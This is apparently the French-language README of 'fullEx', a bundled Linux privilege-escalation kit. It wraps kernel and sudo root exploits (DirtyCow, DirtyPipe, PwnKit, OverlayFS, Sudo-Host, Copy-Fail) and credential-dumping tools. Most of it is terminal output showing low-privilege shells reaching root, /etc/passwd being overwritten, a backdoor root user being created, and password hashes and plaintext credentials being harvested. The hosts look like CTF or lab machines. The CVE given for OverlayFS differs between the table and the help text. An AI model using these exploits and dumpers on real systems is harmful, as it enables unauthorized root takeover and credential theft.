 <img width="1335" height="890" alt="image" src="https://github.com/user-attachments/assets/c947aebb-593b-4027-bc50-ac87663ff387" />


## 💀 Exploits root

| Exploits | CVE |
| --- | --- |
| OverlayFS | CVE-2015-1328 |
| DirtyCow | CVE-2016-5195 |
| PwnKit | CVE-2021-4034 |
| DirtyPipe | CVE-2022-0847 |
| Sudo-Host | CVE-2025-32462 |
| Pack2TheRoot | CVE-2026-41651 |
| Copy-Fail | CVE-2026-31431 |

## ⚙️ Outils

| Outils | Description |
| --- | --- |
| LaZagne | Récupére les mots de passe stocké en local |
| LinPeas | Script d'escalade de privilèges Linux |
| Pspy | Surveille les processus Linux sans autorisations root |
| Dumpcreds | Extrait diverses informations d'identification des processus en cours d'exécution |


## 🛠️ Commandes

Pour rendre executable fullEx.sh faire un -perm

```
vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -help
                                                                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
 
 
Usage: ./fullEx.sh COMMAND
 
Outils:
   -LinPeas       Execute LinPeas
   -LaZagne       Execute LaZagne
   -Pspy64/32     Execute pspy64/32
   -DumpCred      Execute DumpCred
 
Exploits:
   -Overlays      Compilation + execution binaire - CVE-2021-3493
   -DirtyCow      Compilation + execution binaire - CVE-2016-5195
   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
   -DirtyPipe     DirtyPipe - CVE-2022-0847
   -Chroot        Sudo Chroot - CVE-2025-32463
   -Host          Sudo Host - CVE-2025-32462
   -CFail         Copy Fail - CVE-2026-31431
 
Cmds:
   -check         Verifie si gcc est installer
   -perm          Applique les droit d'execution sur '/fullEx'
   -help          Affiche les commandes
 ```
## 🤖 LinPeas

```
www-data@Milburg-High:/tmp/fullEx$ bash fullEx.sh -perm
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

## 👾 LaZagne

```
root@Milburg-High:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: seb
Hash: $6$4.6B1rmh$iaH45IN/kqI4A8Yg0oeY74nXxcicIV3gplln3koT/h2T9qDbs6b0jFWyRyuP5f23OAIyNf5F2WwptKSoDvD4o1:17589:0:99999:7:::

[+] 6 passwords have been found.
For more information launch it again with the -v option

elapsed time = 9.25296401978

```

## 👻 Pspy

```
debian@debian12:~/fullEx$ ./fullEx.sh -Pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/04/03 14:08:16 CMD: UID=1000  PID=848    | /home/debian/fullEx/pspy/pspy64 
2026/04/03 14:08:16 CMD: UID=1000  PID=847    | /bin/bash ./fullEx.sh -Pspy64 
2026/04/03 14:08:16 CMD: UID=1000  PID=636    | -bash 
2026/04/03 14:08:16 CMD: UID=1000  PID=635    | sshd: debian@pts/0   
2026/04/03 14:08:16 CMD: UID=1000  PID=616    | (sd-pam) 
2026/04/03 14:08:16 CMD: UID=1000  PID=615    | /lib/systemd/systemd --user 
2026/04/03 14:08:16 CMD: UID=0     PID=612    | sshd: debian [priv]  
2026/04/03 14:08:16 CMD: UID=0     PID=608    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2026/04/03 14:08:16 CMD: UID=0     PID=607    | /sbin/agetty -o -p -- \u --noclear - linux 
2026/04/03 14:08:16 CMD: UID=0     PID=480    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2026/04/03 14:08:16 CMD: UID=104   PID=471    | avahi-daemon: chroot helper 
2026/04/03 14:08:16 CMD: UID=0     PID=468    | /lib/systemd/systemd-logind 
2026/04/03 14:08:16 CMD: UID=103   PID=467    | /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f 
2026/04/03 14:08:16 CMD: UID=100   PID=464    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2026/04/03 14:08:16 CMD: UID=0     PID=462    | /usr/sbin/cron -f 
2026/04/03 14:08:16 CMD: UID=0     PID=461    | /usr/sbin/avahi-dnsconfd -s 
2026/04/03 14:08:16 CMD: UID=104   PID=459    | avahi-daemon: running [debian.local] 
2026/04/03 14:08:16 CMD: UID=0     PID=458    | /usr/sbin/anacron -d -q -s 
2026/04/03 14:08:16 CMD: UID=997   PID=449    | /lib/systemd/systemd-timesyncd 
```
## 🧽 DumpCreds

Avec sudo
```
debian@debian12:~/fullEx$ sudo ./fullEx.sh -DumpCred
Process 2766 (lightdm)
  Hash shadow (/etc/shadow):
    Hash: $1$tu5P8JO6$g5sEFz1ZfpRzRzvjFffnv. = "password" (nick)
Process 2781 (agetty)
Process 2782 (Xorg)
```
Sans sudo
```
debian@debian12:~/fullEx$ ./fullEx.sh -DumpCred
Process 2940 (systemd)
Process 2942 ((sd-pam))
Process 2969 (dbus-daemon)
Process 2972 (pipewire)
Process 2973 (pipewire)
Process 2974 (wireplumber)
Process 2975 (pipewire-pulse)
Process 2979 (sshd-session:)
Process 2980 (mpris-proxy)
Process 2998 (-bash)
  Param HTTP:
    55b84ddae2f1: --data="username=admin&password=test"
    55b84ddca1b0: password=dump
Process 3288 (bash)
Nbs dumped items: 0
```

## 💀 PwnKit

```
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
./fullEx.sh -PwnKit64
root@Milburg-High:/tmp/fullEx#
```

## 💀 DirtyPipe

```
www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
./fullEx.sh -DirtyPipe
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 131 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
[Dirty Pipe] Program execution completed successfully.
root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
```
## 💀 DirtyCow

```
www-data@ubuntu:/tmp/fullEx$ ./fullEx.sh -DirtyCow
./fullEx.sh -DirtyCow
[+] Compilation successfuly !
[+] PATH=/tmp/fullEx/exploits/DirtyCow/dcow
[+] Executing the binary...
Please enter the new password: azerty

/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash

mmap: 7fdfeb990000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'azerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:
firefart:ficJjR.juFRg6:0:0:pwned:/root:/bin/bash

mmap: 7fdfeb990000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'azerty'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Binary file (standard input) matches

www-data@ubuntu:/tmp/fullEx$ su - firefart
Password: azerty

firefart@ubuntu:/tmp/fullEx# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```

## 💀 OverlayFS

```
www-data@droopy:/tmp/fullEx$ ./fullEx.sh -Overlays
./fullEx.sh -Overlays
[+] Compilation successfuly !
[+] PATH=/tmp/fullEx/exploits/Overlays/overlays
[+] Executing the binary...
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# bash -i
bash: cannot set terminal process group (907): Inappropriate ioctl for device
bash: no job control in this shell
root@droopy:/tmp/fullEx# 
```
## 💀 Sudo-Host

```
ubuntu@ubuntuserver2204:~/fullEx$ ./fullEx.sh -Host
sudo: unable to resolve host dev.test.local: Temporary failure in name resolution
root@ubuntuserver2204:~#
```
## 💀 Copy-Fail

```
user@debian:~/fullEx$ ./fullEx.sh -CFail
# id
uid=0(root) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
#
```
